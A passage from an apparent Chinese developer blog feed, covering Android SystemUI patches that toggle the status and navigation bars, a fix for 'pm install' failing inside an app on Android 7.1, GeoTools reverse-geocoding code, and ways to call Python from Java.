&#125;;</span><br><span class="line">+</span><br><span class="line">+    private void autoHideStatus() &#123;</span><br><span class="line">+        if (mHandler.hasCallbacks(autoHideStatusRunnable)) &#123;</span><br><span class="line">+            mHandler.removeCallbacks(autoHideStatusRunnable);</span><br><span class="line">+        &#125;</span><br><span class="line">+        mHandler.postDelayed(autoHideStatusRunnable, 3000);</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    final private ContentObserver navigationbarShowObserver = new ContentObserver(mHandler) &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onChange(boolean selfChange) &#123;</span><br><span class="line">+            boolean isShow = Settings.System.getInt(mContext.getContentResolver(), Settings.System.NAVIGATION_BAR_SHOW, 1) == 1;</span><br><span class="line">+            if (mNavigationBarView != null &amp;&amp; isShow == false)&#123;</span><br><span class="line">+                mWindowManager.removeViewImmediate(mNavigationBarView);</span><br><span class="line">+                mNavigationBarView = null;</span><br><span class="line">+</span><br><span class="line">+            &#125; else if (mNavigationBarView == null &amp;&amp; isShow == true)&#123;</span><br><span class="line">+                createNavigationBarView(mContext);</span><br><span class="line">+                addNavigationBar();</span><br><span class="line">+                if (Settings.System.getInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_NAVIGATION_BAR, 0) == 1) &#123;</span><br><span class="line">+                    autoHideNavigation();</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    final private ContentObserver statusbarShowObserver = new ContentObserver(mHandler) &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onChange(boolean selfChange) &#123;</span><br><span class="line">+            boolean isShow = Settings.System.getInt(mContext.getContentResolver(), Settings.System.STATUS_BAR_SHOW, 1) == 1;</span><br><span class="line">+            mStatusBarWindow.setVisibility(isShow ? View.VISIBLE : View.GONE);</span><br><span class="line">+            if (Settings.System.getInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_STATUS_BAR, 0) == 1) &#123;</span><br><span class="line">+                autoHideStatus();</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    final private ContentObserver autoHideNavigationbarObserver = new ContentObserver(mHandler) &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onChange(boolean selfChange) &#123;</span><br><span class="line">+            boolean isAutoHide = Settings.System.getInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_NAVIGATION_BAR, 0) == 1;</span><br><span class="line">+            if (isAutoHide) &#123;</span><br><span class="line">+                if (mNavigationBarView != null) &#123;</span><br><span class="line">+                   autoHideNavigation();</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                if (mNavigationBarView == null) &#123;</span><br><span class="line">+                    if (mHandler.hasCallbacks(autoHideNavigationRunnable)) &#123;</span><br><span class="line">+                        mHandler.removeCallbacks(autoHideNavigationRunnable);</span><br><span class="line">+                    &#125;</span><br><span class="line">+                    createNavigationBarView(mContext);</span><br><span class="line">+                    addNavigationBar();</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    final private ContentObserver autoHideStatusbarObserver = new ContentObserver(mHandler) &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onChange(boolean selfChange) &#123;</span><br><span class="line">+            boolean isAutoHide = Settings.System.getInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_STATUS_BAR, 0) == 1;</span><br><span class="line">+            if (isAutoHide) &#123;</span><br><span class="line">+                autoHideStatus();</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                if (mHandler.hasCallbacks(autoHideStatusRunnable)) &#123;</span><br><span class="line">+                    mHandler.removeCallbacks(autoHideStatusRunnable);</span><br><span class="line">+                &#125;</span><br><span class="line">+                mStatusBarWindow.setVisibility(View.VISIBLE);</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    final private ContentObserver qsContainerShowObserver = new ContentObserver(mHandler) &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onChange(boolean selfChange) &#123;</span><br><span class="line">+            boolean isShow = Settings.System.getInt(mContext.getContentResolver(), Settings.System.QS_CONTAINER_SHOW, 1) == 1;</span><br><span class="line">+            qsContainer.setVisibility(isShow ? View.VISIBLE : View.GONE);</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">     private int mInteractingWindows;</span><br><span class="line">     private boolean mAutohideSuspended;</span><br><span class="line">     private int mStatusBarMode;</span><br><span class="line">@@ -737,6 +766,26 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">         mContext.getContentResolver().registerContentObserver(</span><br><span class="line">                 Settings.System.getUriFor(Settings.System.SCREENSHOT_BUTTON_SHOW), true,</span><br><span class="line">                 screenshotShowObserver);</span><br><span class="line">+</span><br><span class="line">+        mContext.getContentResolver().registerContentObserver(</span><br><span class="line">+                Settings.System.getUriFor(Settings.System.NAVIGATION_BAR_SHOW), true,</span><br><span class="line">+                navigationbarShowObserver);</span><br><span class="line">+        </span><br><span class="line">+        mContext.getContentResolver().registerContentObserver(</span><br><span class="line">+                Settings.System.getUriFor(Settings.System.STATUS_BAR_SHOW), true,</span><br><span class="line">+                statusbarShowObserver);</span><br><span class="line">+</span><br><span class="line">+ mContext.getContentResolver().registerContentObserver(</span><br><span class="line">+                Settings.System.getUriFor(Settings.System.AUTO_HIDE_NAVIGATION_BAR), true,</span><br><span class="line">+                autoHideNavigationbarObserver);</span><br><span class="line">+</span><br><span class="line">+        mContext.getContentResolver().registerContentObserver(</span><br><span class="line">+                Settings.System.getUriFor(Settings.System.AUTO_HIDE_STATUS_BAR), true,</span><br><span class="line">+                autoHideStatusbarObserver);</span><br><span class="line">+</span><br><span class="line">+        mContext.getContentResolver().registerContentObserver(</span><br><span class="line">+                Settings.System.getUriFor(Settings.System.QS_CONTAINER_SHOW), true,</span><br><span class="line">+                qsContainerShowObserver);</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     protected void createIconController() &#123;</span><br><span class="line">@@ -1072,7 +1084,7 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">             container.addInflateListener(new InflateListener() &#123;</span><br><span class="line">                 @Override</span><br><span class="line">                 public void onInflated(View v) &#123;</span><br><span class="line">-                    QSContainer qsContainer = (QSContainer) v.findViewById(</span><br><span class="line">+                    qsContainer = (QSContainer) v.findViewById(</span><br><span class="line">                             R.id.quick_settings_container);</span><br><span class="line">                     qsContainer.setHost(qsh);</span><br><span class="line">                     mQSPanel = qsContainer.getQsPanel();</span><br><span class="line">@@ -1700,6 +1712,10 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">     @Override</span><br><span class="line">     public void addNotification(StatusBarNotification notification, RankingMap ranking,</span><br><span class="line">             Entry oldEntry) &#123;</span><br><span class="line">+        if (Settings.System.getInt(mContext.getContentResolver(), Settings.System.NOTIFICATION_BAR_SHOW, 1) == 1) &#123;</span><br><span class="line">+            return;</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">         if (DEBUG) Log.d(TAG, &quot;addNotification key=&quot; + notification.getKey());</span><br><span class="line"> </span><br><span class="line">         mNotificationData.updateRanking(ranking);</span><br></pre></td></tr></table></figure><h2 id="4，在首次开机时添加config属性，用于对每项控制进行配置。"><a href="#4，在首次开机时添加config属性，用于对每项控制进行配置。" class="headerlink" title="4，在首次开机时添加config属性，用于对每项控制进行配置。"></a>4，在首次开机时添加config属性，用于对每项控制进行配置。</h2><p>按照上述方法注册的观察者模式仅有在值发生变化的时候才会执行，开机的时候虽然设置了默认值，但是并不会触发观察者模式，所以我在注册观察者的时候额外根据默认值执行一次配置操作即可在开机的时候进行配置。</p><p>补丁<a href="mailto:&#x72;&#x6b;&#x37;&#49;&#45;&#x66;&#x72;&#x61;&#109;&#101;&#119;&#111;&#x72;&#x6b;&#x73;&#x2d;&#98;&#97;&#x73;&#101;&#x40;&#115;&#x65;&#116;&#95;&#x64;&#101;&#x66;&#x61;&#x75;&#108;&#116;&#95;&#118;&#x61;&#x6c;&#x75;&#101;&#x5f;&#x66;&#111;&#x72;&#x5f;&#110;&#97;&#x76;&#x69;&#103;&#97;&#116;&#105;&#x6f;&#110;&#x5f;&#98;&#97;&#114;&#x2e;&#112;&#x61;&#x74;&#99;&#x68;">&#x72;&#x6b;&#x37;&#49;&#45;&#x66;&#x72;&#x61;&#109;&#101;&#119;&#111;&#x72;&#x6b;&#x73;&#x2d;&#98;&#97;&#x73;&#101;&#x40;&#115;&#x65;&#116;&#95;&#x64;&#101;&#x66;&#x61;&#x75;&#108;&#116;&#95;&#118;&#x61;&#x6c;&#x75;&#101;&#x5f;&#x66;&#111;&#x72;&#x5f;&#110;&#97;&#x76;&#x69;&#103;&#97;&#116;&#105;&#x6f;&#110;&#x5f;&#98;&#97;&#114;&#x2e;&#112;&#x61;&#x74;&#99;&#x68;</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java b/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">index f55d1f7f831..30cc5c8edda 100755</span><br><span class="line">--- a/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">+++ b/packages/SystemUI/src/com/android/systemui/statusbar/phone/PhoneStatusBar.java</span><br><span class="line">@@ -737,6 +766,26 @@ public class PhoneStatusBar extends BaseStatusBar implements DemoMode,</span><br><span class="line">         mContext.getContentResolver().registerContentObserver(</span><br><span class="line">                 Settings.System.getUriFor(Settings.System.SCREENSHOT_BUTTON_SHOW), true,</span><br><span class="line">                 screenshotShowObserver);</span><br><span class="line"></span><br><span class="line">        mContext.getContentResolver().registerContentObserver(</span><br><span class="line">                Settings.System.getUriFor(Settings.System.NAVIGATION_BAR_SHOW), true,</span><br><span class="line">                navigationbarShowObserver);</span><br><span class="line">        </span><br><span class="line">        mContext.getContentResolver().registerContentObserver(</span><br><span class="line">                Settings.System.getUriFor(Settings.System.STATUS_BAR_SHOW), true,</span><br><span class="line">                statusbarShowObserver);</span><br><span class="line">+</span><br><span class="line">+        boolean isShowNavigation = Settings.System.getInt(mContext.getContentResolver(), Settings.System.NAVIGATION_BAR_SHOW, 1) == 1;</span><br><span class="line">+        if (mNavigationBarView != null &amp;&amp; isShowNavigation == false)&#123;</span><br><span class="line">+            mWindowManager.removeViewImmediate(mNavigationBarView);</span><br><span class="line">+            mNavigationBarView = null;</span><br><span class="line">+        &#125; else if (mNavigationBarView == null &amp;&amp; isShowNavigation == true)&#123;</span><br><span class="line">+            createNavigationBarView(mContext);</span><br><span class="line">+            addNavigationBar();</span><br><span class="line">+        &#125;</span><br><span class="line">+        boolean isShowStatus = Settings.System.getInt(mContext.getContentResolver(), Settings.System.STATUS_BAR_SHOW, 1) == 1;</span><br><span class="line">+            mStatusBarWindow.setVisibility(isShowStatus ? View.VISIBLE : View.GONE);</span><br><span class="line">+</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     protected void createIconController() &#123;</span><br></pre></td></tr></table></figure><h2 id="5-问题"><a href="#5-问题" class="headerlink" title="5 问题"></a>5 问题</h2><p>在实现的过程中是有问题没有解决的</p><p>在UI界面，设置的按钮并不会持久化，每次退出然后重进发现所有按钮状态又变成了关闭，在xml文件中有持久化的操作，但是并没有生效，也没有排查到问题。</p><p>同样是在UI界面，没有做回调来修改按钮状态。也就是当两个按钮同时控制状态栏的时候，一个按钮的操作不会响应到另一个按钮，会导致UI界面的值和系统中的值对不上，明明系统中已经开启，但是开关仍是关闭状态</p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码中无法通过pm install安装应用</title>
    <link href="/2023/08/21/Java%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%97%A0%E6%B3%95%E9%80%9A%E8%BF%87pm%20install%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8/"/>
    <url>/2023/08/21/Java%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%97%A0%E6%B3%95%E9%80%9A%E8%BF%87pm%20install%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>Platform: RK3288</p><p>OS: Android 7.1</p><p>现象：APK中使用pm install -r命令，无法安装</p><p>Log:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">11-20 19:06:10.999  4965  4965 D AndroidRuntime: &gt;&gt;&gt;&gt;&gt;&gt; START </span><br><span class="line"></span><br><span class="line">com.android.internal.os.RuntimeInit uid 10039 &lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">11-20 19:06:11.199  4965  4965 D AndroidRuntime: Calling main entry com.android.commands.pm.Pm</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      : Error</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      : java.lang.NullPointerException: Attempt to invoke virtual method &#x27;void android.app.AppOpsManager.checkPackage(int, java.lang.String)&#x27; on a null object reference</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at android.os.Parcel.readException(Parcel.java:2010)</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at android.os.Parcel.readException(Parcel.java:1950)</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at android.content.pm.IPackageInstaller$Stub$Proxy.createSession(IPackageInstaller.java:254)</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at com.android.commands.pm.Pm.doCreateSession(Pm.java:607)</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at com.android.commands.pm.Pm.runInstall(Pm.java:431)</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at com.android.commands.pm.Pm.run(Pm.java:150)</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at com.android.commands.pm.Pm.main(Pm.java:107)</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)</span><br><span class="line">11-20 19:06:11.268  4965  4965 E Pm      :  at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:285)</span><br><span class="line">11-20 19:06:11.270  4965  4965 I app_process: System.exit called, status: 1</span><br><span class="line">11-20 19:06:11.270  4965  4965 I AndroidRuntime: VM exiting with result code 1.</span><br></pre></td></tr></table></figure><p>调试确认因素：</p><ul><li>APK签名是否和系统一致(一致)</li><li>命令行是否可以执行pm install 安装APK(可以)</li><li>是否可以使用adb install安装(可以)</li><li>APK是否可以安装其他非自身APK(不可以)</li><li>是否有添加android.permission.INSTALL_PACKAGES权限(已经添加)</li></ul><p>原因：</p><p>Google在Android 7之后对权限做了加强。</p><p>解决方法：</p><p>调整命令参数<br><code>pm install -i &lt;you installer package name&gt; --user 0 /sdcard/xxx.apk</code></p><p>注意: -i: 是指定安装程序包名称,而不是指定被安装程序包名称</p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于GeoJSON的逆地址编码</title>
    <link href="/2023/08/21/%E5%9F%BA%E4%BA%8EGeoJSON%E7%9A%84%E9%80%86%E5%9C%B0%E5%9D%80%E7%BC%96%E7%A0%81/"/>
    <url>/2023/08/21/%E5%9F%BA%E4%BA%8EGeoJSON%E7%9A%84%E9%80%86%E5%9C%B0%E5%9D%80%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>GeoJSON是一种用于表示地理空间数据的开放标准格式。它基于JSON（JavaScript Object Notation）格式，并提供了一种简洁且易于理解的方式来描述地理特征的几何形状和属性信息。</p><p>GeoJSON支持多种地理要素，包括点、线、多边形、多点、多线和多面。每个地理要素都可以包含几何形状和属性信息。几何形状描述了地理要素的空间位置和形状，例如坐标点、线段或多边形的边界。属性信息是与地理要素相关联的附加数据，可以包含名称、类型、标签等。</p><h2 id="GeoTools"><a href="#GeoTools" class="headerlink" title="GeoTools"></a>GeoTools</h2><p>GeoTools是一个开源的Java库，用于处理地理空间数据和进行地理信息系统（GIS）开发。它提供了一组功能丰富的工具和类，用于读取、写入、分析和操作地理空间数据。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>需求：我有一个包含所有国家区域的GeoJSON，当我传入一个经纬度的时候，需要响应我传递的经纬度信息对应的是哪一个国家。<br>方案：使用GeoTools提供的API，可以读取并解析GeoJSON数据文件，将其转换为GeoTools的特定数据结构。可以使用org.geotools.data.geojson.GeoJSONDataStore类来读取GeoJSON文件。</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import org.geotools.data.DataStore;</span><br><span class="line">import org.geotools.data.DataStoreFinder;</span><br><span class="line">import org.geotools.data.simple.SimpleFeatureCollection;</span><br><span class="line">import org.geotools.data.simple.SimpleFeatureIterator;</span><br><span class="line">import org.geotools.feature.simple.SimpleFeature;</span><br><span class="line">import org.geotools.geometry.jts.JTSFactoryFinder;</span><br><span class="line">import org.locationtech.jts.geom.Coordinate;</span><br><span class="line">import org.locationtech.jts.geom.Geometry;</span><br><span class="line">import org.locationtech.jts.geom.GeometryFactory;</span><br><span class="line">import org.locationtech.jts.geom.Point;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class GeoToolsUtils &#123;</span><br><span class="line"></span><br><span class="line">    public static String getCountryName(double longitude, double latitude) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            File geoJsonFile = new File(&quot;path/to/geojson/file.geojson&quot;);</span><br><span class="line">            Map&lt;String, Object&gt; params = new HashMap&lt;&gt;();</span><br><span class="line">            params.put(&quot;url&quot;, geoJsonFile.toURI().toURL());</span><br><span class="line">            DataStore dataStore = DataStoreFinder.getDataStore(params);</span><br><span class="line">            SimpleFeatureCollection featureCollection = dataStore.getFeatureSource(dataStore.getTypeNames()[0])</span><br><span class="line">                    .getFeatures();</span><br><span class="line">            </span><br><span class="line">            GeometryFactory geometryFactory = JTSFactoryFinder.getGeometryFactory();</span><br><span class="line">            Coordinate coordinate = new Coordinate(longitude, latitude);</span><br><span class="line">            Point point = geometryFactory.createPoint(coordinate);</span><br><span class="line"></span><br><span class="line">            SimpleFeatureIterator iterator = featureCollection.features();</span><br><span class="line">            try &#123;</span><br><span class="line">                while (iterator.hasNext()) &#123;</span><br><span class="line">                    SimpleFeature feature = iterator.next();</span><br><span class="line">                    Geometry geometry = (Geometry) feature.getDefaultGeometry();</span><br><span class="line">                    if (geometry.contains(point)) &#123;</span><br><span class="line">                        String countryName = feature.getAttribute(&quot;country_name&quot;).toString();</span><br><span class="line">                        return countryName;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                iterator.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        double longitude = 123.456; // 替换为实际的经度</span><br><span class="line">        double latitude = 12.345; // 替换为实际的纬度</span><br><span class="line"></span><br><span class="line">        String countryName = getCountryName(longitude, latitude);</span><br><span class="line">        System.out.println(&quot;Country: &quot; + countryName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>上面为GPT提供的参考示例，我在使用时有些小问题<br>具体的实现代码在项目AI相册中</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java调用python服务</title>
    <link href="/2023/08/21/Java%E8%B0%83%E7%94%A8python%E6%9C%8D%E5%8A%A1/"/>
    <url>/2023/08/21/Java%E8%B0%83%E7%94%A8python%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="Java调用python方式有哪几种"><a href="#Java调用python方式有哪几种" class="headerlink" title="Java调用python方式有哪几种"></a>Java调用python方式有哪几种</h2><p>1、使用ProcessBuilder类：Java中的ProcessBuilder类允许您创建并执行外部进程。您可以创建一个Python解释器的进程，并将Python脚本作为参数传递给它。这种方式适用于简单的Python脚本调用。</p><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class PythonProcess &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            ProcessBuilder pb = new ProcessBuilder(&quot;python&quot;, &quot;script.py&quot;);</span><br><span class="line">            Process process = pb.start();</span><br><span class="line">            int exitCode = process.waitFor();</span><br><span class="line">            System.out.println(&quot;Python script execution completed with exit code: &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、使用Runtime类：Java中的Runtime类允许您执行系统命令。您可以使用Runtime.getRuntime().exec()方法来执行Python脚本。</p><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class PythonRuntime &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(&quot;python script.py&quot;);</span><br><span class="line">            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode = process.waitFor();</span><br><span class="line">            System.out.println(&quot;Python script execution completed with exit code: &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、使用Java的Python库（如Jython）：Jython是一个在Java虚拟机上运行的Python解释器，可以在Java程序中直接调用Python代码。您可以将Jython库添加到Java项目中，并使用Java代码直接调用Python脚本或函数。</p><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import org.python.util.PythonInterpreter;</span><br><span class="line"></span><br><span class="line">public class JythonExample &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        PythonInterpreter interpreter = new PythonInterpreter();</span><br><span class="line">        interpreter.exec(&quot;result = 2 + 3&quot;);</span><br><span class="line">        Object result = interpreter.get(&quot;result&quot;);</span><br><span class="line">        System.out.println(&quot;Python script result: &quot; + result);</span><br><span class="line">        interpreter.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder:"></a>ProcessBuilder:</h3><p>ProcessBuilder 是 Java 5 引入的类，用于更灵活地创建和管理外部进程。它允许您设置进程的环境变量、工作目录、重定向输入输出流等。这使得您能够更好地控制外部进程的执行环境。下面是一个简单的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder processBuilder = new ProcessBuilder(&quot;command&quot;, &quot;arg1&quot;, &quot;arg2&quot;);</span><br><span class="line">Process process = processBuilder.start();</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优点：</span><br><span class="line"></span><br><span class="line">更多的灵活性，可以设置环境变量、工作目录等。</span><br><span class="line"></span><br><span class="line">更好的控制标准输入、输出和错误流。</span><br><span class="line"></span><br><span class="line">### Runtime.getRuntime().exec():</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec() 是较早引入的方式，用于执行外部命令。它的使用相对简单，但在某些情况下可能会限制您对进程的控制。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Process process &#x3D; Runtime.getRuntime().exec(“command arg1 arg2”);</p><pre><code>优点：简单易用，适用于基本的命令执行。相对较少的代码量。在性能方面，ProcessBuilder 通常被认为是更优的选择，因为它在创建和管理外部进程时提供了更多的控制选项，并且可以更有效地处理输入输出流。然而，性能的差异可能会在一些情况下非常微小，因此在许多情况下，您可能会选择基于您的代码结构和需求来进行选择。总的来说，如果您需要更多的灵活性和控制，特别是需要重定向标准输入输出、设置环境变量或者切换工作目录，那么 ProcessBuilder 是更好的选择。如果您只是需要执行一个简单的外部命令，Runtime.getRuntime().exec() 也可以满足需求。需要注意的是，自 Java 9 开始，ProcessBuilder 